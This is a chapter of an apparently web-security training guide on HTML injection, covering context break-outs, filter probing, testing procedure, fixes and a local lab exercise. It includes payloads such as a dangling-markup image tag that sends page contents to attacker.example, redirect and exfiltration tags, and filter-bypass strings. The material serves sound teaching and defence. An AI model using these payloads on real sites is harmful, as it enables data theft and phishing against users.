# Chapter 7 — HTML Injection

> HTML injection is XSS's quieter sibling. The attacker controls *markup* (but maybe not
> *script*). It's worth its own chapter because (a) it's harmful on its own, (b) it's the
> stepping stone to XSS, and (c) understanding it cleanly is the best way to understand why
> XSS happens at all.

---

## 7.1 What HTML injection is

HTML injection occurs when an application places untrusted data into an HTML response (or DOM)
**without proper context-appropriate encoding**, so the data is interpreted as *markup* rather
than *text*. The attacker can introduce new tags, attributes, or structure into the page.

The distinction from XSS is one of degree:

- **HTML injection (a.k.a. content/markup injection):** you can inject HTML elements and
  attributes, but for some reason can't (yet) run JavaScript — perhaps `<script>` and event
  handlers are filtered, or CSP blocks script.
- **XSS:** your injected markup achieves JavaScript execution.

Every XSS *is* an HTML (or script-context) injection that reached code execution. So mastering
injection is mastering the root cause.

## 7.2 Why it happens: the data/markup confusion

Recall the core lesson of Part I: a browser decides whether `<` starts a tag based on parsing
context, and the defense is to **encode data so its special characters render as text**. HTML
injection is simply the failure to do that encoding in the context where the data lands.

```python
# Vulnerable (pseudocode): user-controlled `name` concatenated into HTML
html = "<h1>Welcome, " + name + "</h1>"
```

If `name` is `Alice`, the page shows "Welcome, Alice." If `name` is
`<u>Alice</u>`, the browser renders an underlined name — the markup was interpreted. The fix is
to encode `name` so `<` becomes `&lt;` (see §7.9). The presence of *any* interpreted markup is
the proof of injection.

## 7.3 Demonstrating injection safely

Your first probe is not a script payload — it's a harmless tag that proves markup is
interpreted. Good, low-noise markers:

```html
<b>zqxj</b>            <!-- does "zqxj" render bold? -->
<u>zqxj</u>
<i>zqxj</i>
<h1>zqxj</h1>          <!-- structural change is very visible -->
```

If `zqxj` renders bold/underlined/as a heading, you have HTML injection. This is a clean,
defensible proof of concept that doesn't execute anything — ideal for the "least invasive PoC"
principle from [Chapter 1](../01-legal-and-ethics.md). Only after confirming injection do you
escalate toward script (Chapter 8+), and only within scope.

## 7.4 The impact of "just" HTML injection

People underrate non-script injection. Even without JavaScript, controlling markup lets an
attacker:

- **Deface content** — insert misleading text, fake notices, altered prices, or offensive
  material attributed to the victim site.
- **Phish in-context (content spoofing).** Inject a convincing "Your session expired, please
  re-enter your password" form whose `action` points at the attacker. Because it's on the real
  domain with the real TLS padlock, victims trust it. This is one of the most damaging
  no-script outcomes.
- **Hijack relative URLs** via an injected `<base href>` (Chapter 5) — repointing forms,
  scripts, links, and images at attacker infrastructure.
- **Exfiltrate via markup.** An injected `<img src="//attacker/?d=...">` makes the browser
  fire a request; CSS and `<link>` can leak too. Dangling-markup techniques (next section)
  steal page contents *without any script*.
- **Redirect** via `<meta http-equiv="refresh" content="0;url=//attacker">`.
- **Set up clickjacking/UI redress** with injected styled overlays.
- **Trigger CSRF** by injecting an auto-submitting form.

So even when CSP or filters stop script, injection is a real finding. Report it as such.

## 7.5 Dangling-markup injection (script-free data theft)

This technique deserves a focused look because it works even when script is impossible.

Suppose you can inject markup *before* some sensitive content on the page (a CSRF token, an
email address, a one-time code rendered later in the HTML). You inject an *unterminated*
attribute that "swallows" the following markup up to the next matching quote, sending it to
your server:

```html
<!-- Attacker injects this earlier in the page: -->
<img src="https://attacker.example/collect?leak=
```

Because the `src` attribute's value is never closed, the browser keeps consuming page bytes —
including the sensitive token that appears after the injection point — until it hits the next
`"` in the document. When the image request fires, the swallowed content is in the query string
sent to the attacker. No JavaScript required, so CSP `script-src` doesn't help; this is why
defenses like proper encoding (and CSP directives that constrain where requests can go) matter
even against "non-script" bugs.

Modern browsers have added mitigations (e.g., refusing to load images with raw newlines in the
URL, and CSP can restrict `img-src`/`connect-src`), but dangling markup remains a powerful
illustration that *markup control alone* can breach confidentiality.

## 7.6 Injection in different contexts (the same idea, different break-outs)

HTML injection follows the exact context map from Chapter 2. Your payload depends on where you
land:

**Element content** — you're already in markup; just add tags:
```
input:  <b>zqxj</b>
result: <p><b>zqxj</b></p>     ← interpreted
```

**Quoted attribute value** — first break out of the attribute, then add markup:
```
template: <input value="HERE">
input:    "><b>zqxj</b>
result:   <input value=""><b>zqxj</b>    ← escaped the attribute
```

**Unquoted attribute value** — a space introduces a new attribute (no quote needed):
```
template: <img alt=HERE>
input:    x onerror=...          ← but for pure HTML injection: x title=zqxj
```

**Inside a tag, between attributes** — inject a new attribute:
```
template: <input HERE value="x">
input:    onfocus=... autofocus  ← attribute-context (becomes XSS in Ch.8)
```

**Comment** — close the comment first:
```
template: <!-- HERE -->
input:    --><b>zqxj</b><!--
```

**`<textarea>`/`<title>`/`<script>`** — close the special element first:
```
template: <textarea>HERE</textarea>
input:    </textarea><b>zqxj</b>
```

Notice the recurring move: **identify what ends the current context, emit that, then inject.**
This is the single most important manual skill in Part III.

## 7.7 When encoding is partial: probing the filter

Often the app encodes *some* characters but not others, or strips certain tags. Map the filter
before crafting a payload:

1. Submit the canary (`zqxj'"<>`/\(){}[];:=&#`) and see which characters survive (Chapter 6).
2. If `<` and `>` survive but `"` is encoded, you may still inject tags in element content but
   not break out of double-quoted attributes.
3. If tags are stripped by name (e.g., `<script>` removed), test whether the *stripping is
   recursive*. A classic bypass: `<scr<script>ipt>` — if the filter removes the inner
   `<script>` once and doesn't re-scan, the remaining characters re-form `<script>`.
4. Test case and whitespace variants (`<ScRiPt>`, `<img/src>`), entity encoding in attribute
   contexts (`&#x6a;avascript:`), and the special-element tricks from Chapter 3.

The goal is to characterize *exactly* what the filter does, then find the gap. Filters are
blocklists; blocklists have holes.

## 7.8 Detecting HTML injection (tester's procedure)

1. **Find reflections** of your marker (Chapter 6).
2. **Inject a benign tag** (`<b>zqxj</b>`) and check whether it's interpreted in the rendered
   DOM (not just present as text in View Source).
3. **Identify the context** and the encoding applied.
4. **Determine reach** — only you, or other users/admins (stored)?
5. **Assess escalation** — can you reach a script or URL context (→ XSS, Chapter 8–10) or only
   structural markup (→ content spoofing/dangling markup)?
6. **Document** with the exact input, the exact location, the rendered result, and impact.

A subtlety: always confirm in the **rendered DOM**. An app might HTML-encode in the byte stream
but then a client-side script reads the value and writes it via `innerHTML`, re-introducing the
injection. View Source can lie; the Elements panel tells the truth.

## 7.9 Fixing HTML injection (preview of Part VI)

The fix is the same as for XSS and is covered fully in
[Chapter 18](../part6/18-defense-remediation.md), but in brief:

- **Context-appropriate output encoding** is the primary control. For HTML element content and
  quoted attribute values, HTML-entity-encode `< > & " '` (and prefer encoding to a strict
  allow-list of safe characters). Modern template engines do this automatically — *if* you
  don't bypass them with "raw"/"safe"/`|safe`/`dangerouslySetInnerHTML`-style escape hatches.
- **For rich text** (where some HTML must be allowed), don't hand-roll a filter — use a
  vetted, well-maintained HTML **sanitizer** (e.g., a library built for this) configured with
  a strict allow-list, and be aware of mutation-XSS (Chapter 3).
- **Validate URL schemes** when data lands in `href`/`src` (allow only `http`/`https`/`mailto`
  as appropriate; reject `javascript:`/`data:`).
- **Defense in depth:** a strong **Content Security Policy** (Chapter 19) limits what injected
  markup can do even if a bug slips through.

The throughline: **encode on output, in the right context, every time.** Input "sanitization"
that tries to clean data on the way in is fragile and context-blind; output encoding at the
point of use is the durable fix.

## 7.10 Lab exercise

In a local vulnerable app (Chapter 17), find a field that reflects without encoding (DVWA's
"XSS (Reflected)" set to *low* is ideal, or Juice Shop's search). Then:

1. Prove HTML injection with `<b>zqxj</b>`.
2. Identify the context and which canary characters survive.
3. Without using script, build a **content-spoofing** PoC: inject a fake "session expired"
   banner. Observe how convincing it looks on the real domain.
4. Now raise the security level / enable encoding and watch the same payload render as inert
   text. Compare View Source vs the Elements panel.

This progression — inert text → interpreted markup → escalation — is the mental model you'll
reuse for all of XSS.

---

## Key takeaways

- HTML injection = untrusted data interpreted as **markup** due to missing context-appropriate
  encoding. Every XSS is an injection that reached code execution.
- Prove it harmlessly first with a benign tag like `<b>zqxj</b>`; escalate only in scope.
- Even without script, injection enables **content spoofing/phishing**, `<base>`/redirect
  hijacking, and **dangling-markup data theft** — report it as a real finding.
- Payload shape is dictated by **context**: find what ends the current context, emit it, then
  inject.
- Filters are blocklists with holes (recursive-strip bypass, case/whitespace/entity tricks).
- Fix with **context-appropriate output encoding**, vetted sanitizers for rich text, URL-scheme
  validation, and CSP as defense in depth.

---

[← Previous: Chapter 6 — Mapping the HTML Attack Surface](../part2/06-attack-surface.md) | [Next: Chapter 8 — Reflected XSS →](08-xss-reflected.md)
